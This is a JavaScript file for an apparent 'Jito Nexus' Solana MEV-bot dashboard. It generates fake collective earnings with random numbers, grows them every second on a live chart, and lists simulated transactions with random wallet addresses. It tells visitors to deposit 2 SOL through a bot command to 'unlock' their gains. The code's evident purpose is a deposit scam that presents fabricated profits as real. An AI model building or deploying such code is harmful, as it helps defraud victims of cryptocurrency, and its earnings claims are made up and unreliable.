let currentBalance = 0;
let startTime;
let chart;

console.log("Script loaded");

document.addEventListener("DOMContentLoaded", function() {
    console.log("DOM fully loaded");
    initializeApp();
    setInterval(updateApp, 1000); // Update every second
    setInterval(fetchRecentTransactions, 1000); // Fetch transactions every second
});

function initializeApp() {
    console.log("Initializing app");
    loadSavedData();
    if (!startTime) {
        startTime = new Date();
        currentBalance = Math.random() * (16000 - 145) + 145;
    }
    updateTodayStats();
    initializeWallet();
    updateMyGains();
    fetchRecentTransactions();
    initializeStatsGraph();
    showTab('today-stats'); // Show Today's Stats tab by default
}

function loadSavedData() {
    const savedBalance = localStorage.getItem('currentBalance');
    const savedStartTime = localStorage.getItem('startTime');
    if (savedBalance && savedStartTime) {
        currentBalance = parseFloat(savedBalance);
        startTime = new Date(parseInt(savedStartTime));
        console.log("Loaded saved data:", currentBalance, startTime);
    }
}

function saveData() {
    localStorage.setItem('currentBalance', currentBalance.toString());
    localStorage.setItem('startTime', startTime.getTime().toString());
    console.log("Saved data:", currentBalance, startTime);
}

function updateApp() {
    const now = new Date();
    if (now - startTime >= 24 * 60 * 60 * 1000) {
        console.log("24 hours passed, resetting");
        startTime = new Date();
        currentBalance = Math.random() * (16000 - 145) + 145;
    } else {
        updateTodayStats();
    }
    saveData();
}

function updateTodayStats() {
    // Increase by approximately 30 SOL per minute (0.5 SOL per second)
    currentBalance += 0.5 * (Math.random() * 0.2 + 0.9); // Random factor between 0.9 and 1.1 for slight variation
    console.log("Updating stats, current balance:", currentBalance.toFixed(2));

    document.getElementById("sol-balance").textContent = `${currentBalance.toFixed(2)} SOL`;
    document.getElementById("stats-description").textContent = 
        `🚀 Jito Nexus Users have collectively earned ${currentBalance.toFixed(2)} SOL today! Watch as the balance grows throughout the day, showcasing the power of MEV strategies. Earnings reset every 24 hours, so keep an eye on the graph to see the real-time impact!`;
    updateStatsGraph();
}

function initializeWallet() {
    console.log("Initializing wallet");
    document.getElementById("wallet-instructions").innerHTML = 
        "💼 To activate your Jito Nexus wallet and start earning, head over to our bot and type <strong>/get_wallet</strong>. Deposit 2 SOL to activate your wallet and unlock the power of MEV strategies!";
    document.getElementById("wallet-balance").textContent = "Balance: 0 SOL";
}

function updateMyGains() {
    console.log("Updating gains");
    const gainsContent = document.getElementById("gains-content");
    gainsContent.innerHTML = `
        <span class="lock-icon">🔒</span>
        <p id="gains-message">To access your gains, please deposit 2 SOL. Head to the bot and type <strong>/get_wallet</strong> to obtain your wallet and make the deposit. Unlock the potential of your earnings once you've activated your account!</p>
    `;
}

function fetchRecentTransactions() {
    console.log("Fetching recent transactions");
    // Simulated transactions for testing
    const transactions = [
        { type: 'transfer', amount: (Math.random() * 10).toFixed(4) + ' SOL', time: new Date().toLocaleTimeString(), fromAddress: generateRandomAddress(), toAddress: generateRandomAddress() },
        { type: 'swap', amount: 'Token Swap', time: new Date().toLocaleTimeString(), fromAddress: generateRandomAddress(), toAddress: 'N/A' },
        { type: 'other', amount: 'Unknown', time: new Date().toLocaleTimeString(), fromAddress: generateRandomAddress(), toAddress: 'N/A' }
    ];
    displayTransactions(transactions);
}

function generateRandomAddress() {
    return Math.random().toString(36).substring(2, 6) + '...';
}

function displayTransactions(transactions) {
    console.log("Displaying transactions");
    const transactionsList = document.getElementById("transactions-list");
    transactionsList.innerHTML = "";
    transactions.forEach(tx => {
        const txElement = document.createElement("div");
        txElement.className = "transaction";
        if (tx.type === 'transfer') {
            txElement.innerHTML = `
                <h3>Nexus Wallet Transfer</h3>
                <p>Amount: ${tx.amount} transferred at ${tx.time}</p>
                <p>From: ${tx.fromAddress} To: ${tx.toAddress}</p>
            `;
        } else if (tx.type === 'swap') {
            txElement.innerHTML = `
                <h3>Nexus Wallet Attack</h3>
                <p>Token Swap occurred at ${tx.time}</p>
                <p>Initiated by: ${tx.fromAddress}</p>
            `;
        } else {
            txElement.innerHTML = `
                <h3>Other Transaction</h3>
                <p>Unknown transaction type at ${tx.time}</p>
                <p>Initiated by: ${tx.fromAddress}</p>
            `;
        }
        transactionsList.appendChild(txElement);
    });
}

function showTab(tabId) {
    console.log("Showing tab:", tabId);
    const tabs = document.getElementsByClassName("tab-content");
    for (let tab of tabs) {
        tab.style.display = "none";
    }
    document.getElementById(tabId).style.display = "block";
}

function initializeStatsGraph() {
    console.log("Initializing stats graph");
    const ctx = document.getElementById('stats-graph');
    if (!ctx) {
        console.error("Canvas element not found");
        return;
    }
    chart = new Chart(ctx, {
        type: 'line',
        data: {
            labels: [],
            datasets: [{
                label: 'SOL Balance',
                data: [],
                borderColor: 'rgba(0, 255, 255, 1)',
                borderWidth: 2,
                fill: false,
                pointRadius: 0
            }]
        },
        options: {
            responsive: true,
            animation: {
                duration: 0
            },
            scales: {
                x: {
                    type: 'time',
                    time: {
                        unit: 'minute',
                        displayFormats: {
                            minute: 'HH:mm'
                        }
                    },
                    ticks: {
                        color: 'rgba(255, 255, 255, 0.7)'
                    },
                    grid: {
                        color: 'rgba(255, 255, 255, 0.1)'
                    }
                },
                y: {
                    beginAtZero: false,
                    ticks: {
                        color: 'rgba(255, 255, 255, 0.7)'
                    },
                    grid: {
                        color: 'rgba(255, 255, 255, 0.1)'
                    }
                }
            },
            plugins: {
                legend: {
                    display: false
                }
            }
        }
    });
}

function updateStatsGraph() {
    if (!chart) {
        console.error("Chart not initialized");
        return;
    }
    console.log("Updating stats graph");
    const now = new Date();
    chart.data.labels.push(now);
    chart.data.datasets[0].data.push(currentBalance);
    if (chart.data.labels.length > 100) {
        chart.data.labels.shift();
        chart.data.datasets[0].data.shift();
    }
    chart.update();
}